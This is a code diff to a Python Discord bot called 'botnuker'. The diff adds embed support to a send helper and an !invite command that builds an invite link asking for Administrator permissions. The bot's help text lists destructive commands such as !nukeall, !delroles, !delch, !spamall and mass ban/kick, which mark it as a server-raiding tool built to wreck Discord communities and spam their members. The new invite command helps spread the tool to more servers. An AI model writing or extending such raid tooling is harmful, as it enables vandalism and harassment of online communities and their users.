@@ -80,12 +80,17 @@ async def safe_call(coro_factory, retries: int = 5):
                 return None
     return None
 
-async def safe_send(target, content: str):
+async def safe_send(target, content: str = None, embed=None):
     try:
+        kwargs = {}
+        if content is not None:
+            kwargs["content"] = content
+        if embed is not None:
+            kwargs["embed"] = embed
         if isinstance(target, commands.Context):
-            await safe_call(lambda: target.send(content))
+            await safe_call(lambda: target.send(**kwargs))
         else:
-            await safe_call(lambda: target.send(content))
+            await safe_call(lambda: target.send(**kwargs))
     except Exception:
         pass
 
@@ -136,8 +141,35 @@ async def help_cmd(ctx):
         "!help\n!ban / !kick\n!delch\n"
         "!hypercreate [name] [amount] / !hc\n"
         "!spam [msg] [count]\n!spamall [msg] [per_channel]\n"
-        "!delroles\n!nukeall\n!setban / !setkick",
+        "!delroles\n!nukeall\n!setban / !setkick\n!invite",
     )
+
+@bot.command(name="invite")
+async def invite_cmd(ctx):
+    client_id = bot.user.id
+    perms = discord.Permissions(administrator=True)
+    invite_url = discord.utils.oauth_url(client_id, permissions=perms)
+
+    embed = discord.Embed(
+        title="Invite botnuker",
+        description="Click the link below to add the bot to your server.",
+        color=discord.Color.dark_red(),
+        url=invite_url,
+    )
+    embed.add_field(
+        name="Permissions",
+        value="Administrator",
+        inline=False,
+    )
+    embed.add_field(
+        name="Invite link",
+        value=invite_url,
+        inline=False,
+    )
+    embed.set_thumbnail(url=bot.user.display_avatar.url)
+    embed.set_footer(text="botnuker")
+
+    await safe_send(ctx, embed=embed)
 
 @bot.command(name="setban")
 async def set_ban(ctx):
